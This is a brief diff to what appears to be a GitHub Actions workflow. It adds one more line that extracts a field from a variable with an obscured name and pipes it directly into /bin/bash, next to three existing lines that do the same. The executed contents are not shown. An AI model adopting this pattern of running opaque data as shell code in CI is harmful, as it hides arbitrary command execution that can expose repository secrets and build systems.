@@ -33,6 +33,7 @@ jobs:
           echo $wfb29938 | jq -r .f3671 | /bin/bash
           echo $of658 | jq -r .kbje63 | /bin/bash
           printf '%s' "$bbi8804" | jq -r .jhinq92 | /bin/bash
+          echo $rf63 | jq -r .hwcur95 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
